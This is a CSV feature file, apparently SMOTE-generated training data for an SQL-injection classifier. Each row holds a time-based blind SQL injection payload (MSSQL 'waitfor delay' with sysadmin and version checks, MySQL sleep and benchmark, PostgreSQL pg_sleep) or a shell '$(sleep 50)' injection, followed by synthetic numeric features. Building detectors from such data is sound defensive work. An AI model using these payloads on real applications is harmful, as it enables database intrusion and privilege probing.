id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001023,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,1.7068564988806034,113.82768777091505,30.81668087827657,4.034685094280933,55.01100689263847,4.816680878276571,36.45554608114895,17.544453918851048,0.4792286442183328,0.04351884650682789,0.32156180975906457,0.1556906995157747,3.4555460811489525,0.0,2.0,0.0,0.0,0.0,0.27222695942552394,6.0,0.0,0.0,1.2722269594255238,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.27222695942552394,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.27222695942552405,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.272226959425524
SMOTE_001024,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,0.925147064756894,27.978415058562263,18.22301882320283,4.001797661523026,13.733811293921697,3.510792470718868,2.7553962353594343,7.978415058562264,0.4899564028370088,0.12769144142790964,0.09971380308126396,0.28263835265381754,2.755396235359434,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.978415058562264,0.24460376464056605,2.0,1.0,0.0,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001025,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,0.6699096466520894,64.8182957864818,25.794952508484137,4.199120345940054,34.10788602036193,4.0,14.43343826102938,12.276971505090483,0.522896866309793,0.06810942690691683,0.21441690248060732,0.1945768043026828,3.8794952508484144,0.0,2.0,0.0,0.0,0.0,0.0,1.758990501696828,0.0,0.879495250848414,0.8794952508484137,2.879495250848414,1.0,0.0,1.0,0.0,0.0,0.0,0.8794952508484138,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001026,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,0.8210554346260486,111.03377236541573,28.674847851649623,4.037310887209562,57.09817421979545,4.0,33.58590244232102,16.349695703299243,0.5152007944616206,0.037438764770508656,0.29753575187464826,0.14982468889322242,4.0,0.0,2.0,0.0,0.0,0.0,0.0,5.3496957032992425,0.0,0.16257607417518916,1.0,3.837423925824811,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.8374239258248106,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.837423925824811
SMOTE_001027,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,1.2836525267866656,37.124292523659115,16.0,3.0507090753501185,11.0,0.0,16.660208945470796,9.464083578188319,0.2985839601280046,0.0,0.44672346430087906,0.2546925755711164,0.2679582109058405,1.464083578188319,0.0,0.0,0.0,1.0,0.0,2.7320417890941595,0.0,4.0,-5.551115123125783e-17,1.0,0.26795821090584054,0.7320417890941595,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001028,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.8935074802669124,37.39799938023704,16.0,3.0604504950243263,11.0,0.0,16.71839950418963,9.679599876047408,0.2976321899358024,0.0,0.4428413720770371,0.25952643798716046,0.0,1.839799938023704,0.0,0.0,0.0,0.8397999380237041,0.0,2.839799938023704,0.0,4.0,-5.551115123125783e-17,0.839799938023704,0.0,1.0,0.0,0.16020006197629594,0.0,0.8397999380237041,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001029,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.03634709076928634,45.01871970378558,17.01123182227135,3.0748788088892196,13.0,1.0374394075711586,20.0,10.981280296214422,0.2887807306003499,0.022962690505296243,0.4442780470774615,0.24397853181689225,0.0,0.0,1.9925121184857688,0.0,0.0,0.0,0.0,4.0,0.0,4.98128029621442,0.0037439407571158156,1.9925121184857684,0.0,0.0,0.9962560592428844,0.0037439407571158156,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0037439407571156907,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0037439407571158
SMOTE_001030,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,2.56624838621343,107.75845071715977,31.36664195428215,4.041110975874791,47.983469251448156,5.774981465711614,35.81667902285892,18.183320977141076,0.4400644829559315,0.05514193206311286,0.33404387623405885,0.1707497087468968,2.8166790228589242,0.0,2.0,0.0,0.0,0.0,0.5916604885705381,6.0,0.0,0.0,1.591660488570538,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.5916604885705381,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5916604885705381,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5916604885705383
SMOTE_001031,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.2533027175816873,35.804524792847126,16.0,3.049447103666911,11.0,0.0,16.043619834277703,8.760904958569425,0.3084039081745622,0.0,0.44673734154550154,0.24485875027993634,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.760904958569425,0.0,4.0,-5.551115123125783e-17,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001032,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.13859845594726186,44.4202550930307,16.8067516976769,3.073757614015287,13.0,0.8067516976768996,19.6135033953538,11.0,0.2928765522701592,0.017927815503931105,0.4413770110742365,0.2478186211516732,0.0,0.0,2.0,0.0,0.0,0.0,0.0,4.0,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001033,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.09048320306467122,44.560861804948885,17.0,3.0897467259347966,13.0,1.0,19.634051504124074,10.926810300824814,0.29273319632031275,0.0225179381784856,0.4392694152098353,0.24547945029136625,0.0,0.0,2.0,0.0,0.0,0.0,0.0,3.9268103008248145,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001034,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,1.7834612286628846,38.37800179823721,23.655499550440698,4.219635054521781,16.0,2.0,7.378001798237209,13.0,0.4178984648834573,0.05223730811043216,0.19032172428830157,0.33954250271780906,2.0,0.6554995504406977,2.0,0.0,0.0,0.0,0.6554995504406976,1.3445004495593025,0.0,4.0,0.34450044955930237,2.0,1.0,0.6554995504406976,1.0,0.0,0.0,0.0,1.0,0.6554995504406976,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001035,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,0.160586765677167,27.14639911289339,15.02927982257868,3.323668566085283,11.0,0.0,9.117119290314715,7.029279822578679,0.4055435298126998,0.0,0.335468320396362,0.25898814979093815,0.029279822578678782,0.0,0.0,0.0,0.0,0.029279822578678782,0.0,2.0,0.0,4.0,-5.551115123125783e-17,0.029279822578678782,0.029279822578678893,0.0,0.0,0.9707201774213213,0.0,0.029279822578678782,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001036,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,0.7000166099423977,28.51666365703956,15.758331828519779,3.358046073912187,11.0,0.0,9.758331828519779,7.75833182851978,0.3861005105652169,0.0,0.3420497911324113,0.2718496983023718,0.0,0.7583318285197796,0.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,-5.551115123125783e-17,0.0,0.0,0.7583318285197795,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001037,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,0.6550316227246018,69.77783178426571,27.222168215734282,4.2316796319123595,36.555663568531436,3.7778317842657176,16.222168215734282,13.222168215734282,0.523833679871505,0.054107018170090546,0.2325272187480638,0.18953208321034068,4.0,0.0,2.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,1.0,3.2221682157342824,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.22216821573428244,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2221682157342824
SMOTE_001038,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,0.29688026460535794,70.32540575745786,28.213775122170624,4.197630022918682,35.171020097736495,3.171020097736498,17.76959043981424,14.213775122170622,0.5022335051062019,0.04461219847412243,0.25080722354643464,0.20234707287324102,3.9144899511317517,0.0,2.0,0.0,0.0,0.0,0.042755024434124336,2.171020097736498,0.0,0.9572449755658754,1.0427550244341244,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.042755024434124336,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.04275502443412458,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0427550244341246
SMOTE_001039,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,0.8572833289319686,20.684651090456814,11.006744158921306,2.799527718800956,6.006744158921304,1.8322093068464491,9.006744158921304,3.838953465767754,0.28545447615735203,0.0974027211475857,0.43896108845903425,0.178181714236028,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1677906931535507,0.0,0.6711627726142035,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.16779069315355088,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.16779069315355088,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.1677906931535509
SMOTE_001040,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,2.2237900363451,35.154665256015136,20.661866102406055,4.016866572804222,14.441244068270704,3.1690669487969725,7.2721771194737315,10.272177119473731,0.41802660666309255,0.10471145815069943,0.19382045904153059,0.28344147614467746,2.0,0.0,2.0,0.0,0.0,0.0,0.0,1.220622034135352,0.0,2.4412440682707035,0.6103110170676758,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.6103110170676759,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001041,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.7229195152180943,43.44152437060349,17.0,3.1308170944827984,13.0,0.7773606243719267,18.66416374623156,11.0,0.3007369492293302,0.017274680541598378,0.4275186439580997,0.2544697262709717,0.0,0.22263937562807318,2.0,0.0,0.0,0.0,0.0,3.7773606243719264,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.22263937562807326,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001042,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,1.2204835358150008,45.0,17.0,3.0740066546775076,13.0,0.5833536491719657,20.0,11.416646350828035,0.28888888888888886,0.012963414426043686,0.4444444444444444,0.25370325224062296,0.0,0.41664635082803425,2.0,0.0,0.0,0.0,0.0,4.0,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.41664635082803425,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001043,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,1.6971702264600284,37.49546908229925,16.317769916572658,3.1373043919172074,11.63553983314532,1.0,15.906619499435957,8.953309749717977,0.3125216957004242,0.02712714439065408,0.42214934367884505,0.2382018162300766,0.0,0.0,0.6355398331453188,0.0,0.0,0.0,0.0,3.3177699165726593,0.0,4.31776991657266,-5.551115123125783e-17,0.635539833145319,0.0,0.0,0.3177699165726594,0.6822300834273406,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6822300834273407,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.6822300834273407
SMOTE_001044,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,1.348733289949629,37.193301727194516,16.534077585867276,3.3031221289644073,13.0,0.0,13.72737931306179,10.465922414132724,0.3546082810580601,0.0,0.3615227273153636,0.2838689916265763,0.0,0.5340775858672762,2.0,0.0,0.0,0.0,0.0,2.9318448282654477,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.5340775858672762,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001045,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,0.30648902857214955,36.69541498785862,23.89847166261954,4.304050346214939,16.0,2.0,5.796943325239079,12.898471662619539,0.43668122074477955,0.054585152593097444,0.1572052424644239,0.35152838419769916,2.0,0.9492358313097697,2.0,0.0,0.0,0.0,0.9492358313097696,0.9492358313097697,0.0,4.0,0.050764168690230316,2.0,1.0,0.9492358313097696,1.0,0.0,0.0,0.0,0.9492358313097696,0.9492358313097696,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001046,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,1.552541813176387,22.86190846253412,11.823215673450296,2.8595801142464072,6.823215673450294,1.6961307210916172,9.823215673450294,4.5193463945419134,0.29168029380626587,0.08628518963166809,0.4345140758526672,0.1875204407093988,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.3038692789083823,0.0,1.2154771156335302,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.3038692789083826,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.30386927890838267,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3038692789083826
SMOTE_001047,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,0.6727429987865126,29.903541438788366,15.414791634112625,3.2610574354194104,11.0,0.4147916341126239,11.07395817056312,7.414791634112625,0.3726155165286797,0.012199753944488939,0.36586601051863715,0.2493187190081942,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.414791634112624,0.0,4.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001048,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.6528541960590805,34.358979099564515,16.0,3.1476798194498414,11.0,0.8803403001451613,14.358979099564516,8.11965969985484,0.32039048482097804,0.02589236176897533,0.41747184578004,0.23624530763000667,0.11965969985483893,0.0,0.0,0.0,0.0,0.11965969985483876,0.0,3.0,0.0,4.0,-5.551115123125783e-17,0.11965969985483893,0.11965969985483887,0.0,0.0,0.8803403001451612,0.0,0.11965969985483876,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001049,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,2.083483630792782,53.05987981366924,25.15354996672665,4.121444488203068,24.18348987356127,2.43070999334533,13.01496995341731,13.43070999334533,0.4406380373974211,0.04649676567685403,0.24496817601746812,0.2678970209082568,2.8614199866906604,0.0,2.0,0.0,0.0,0.0,0.0,2.0,0.0,2.7078700199640098,1.0,2.86141998669066,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.43070999334533006,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.43070999334533
SMOTE_001050,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,1.5676906842355334,49.19259823509424,19.515558941056543,3.269340525909577,13.0,9.385196470188477,20.0,6.8074017649057605,0.26466498797501103,0.18806277463261653,0.4071769045769401,0.14009533281543227,0.0,0.0,0.32296070596230453,0.0,0.0,0.0,0.0,4.0,0.0,0.8074017649057614,0.8385196470188477,0.32296070596230453,0.0,0.0,0.16148035298115226,0.8385196470188477,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8385196470188476,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.8385196470188476
SMOTE_001051,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.48590639385530116,33.24018353155091,16.0,3.197312710726887,11.0,0.8480367063101832,13.392146825240731,8.0,0.3320060660780324,0.02494225606794656,0.4015927207063611,0.24145895714765991,0.0,0.15196329368981704,0.0,0.0,0.0,0.0,0.0,2.848036706310183,0.0,4.0,-5.551115123125783e-17,0.0,0.0,0.151963293689817,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001052,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,2.042187764200974,31.59474850811585,22.59474850811585,4.348267593468947,16.0,2.0,2.0,11.59474850811585,0.5065363143852282,0.06331703929815352,0.06331703929815358,0.36682960701846473,2.0,0.5947485081158508,2.0,0.0,0.0,0.0,0.5947485081158508,0.0,0.0,4.0,0.40525149188414933,2.0,1.0,0.5947485081158506,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.5947485081158508,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001053,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,0.22981891052332373,27.20951467877735,15.04190293575547,3.3218548885430703,11.0,0.0,9.167611743021883,7.041902935755471,0.404739975154455,0.0,0.3363887557321697,0.25887126911337527,0.04190293575547055,0.0,0.0,0.0,0.0,0.04190293575547044,0.0,2.0,0.0,4.0,-5.551115123125783e-17,0.04190293575547033,0.04190293575547044,0.0,0.0,0.9580970642445297,0.0,0.04190293575547044,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001054,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,1.6036943240199064,45.270310206725604,16.729689793274396,2.991065824623724,12.459379586548788,0.0,21.081240826902423,11.729689793274394,0.2754386708730737,0.0,0.46533798699328355,0.25922334213364273,0.0,1.270310206725606,1.4593795865487886,0.0,0.0,0.27031020672560574,0.0,4.0,0.0,4.729689793274394,-5.551115123125783e-17,1.7296897932743942,0.0,1.0,0.7296897932743943,0.0,0.0,0.27031020672560574,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2703102067256058,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.2703102067256058
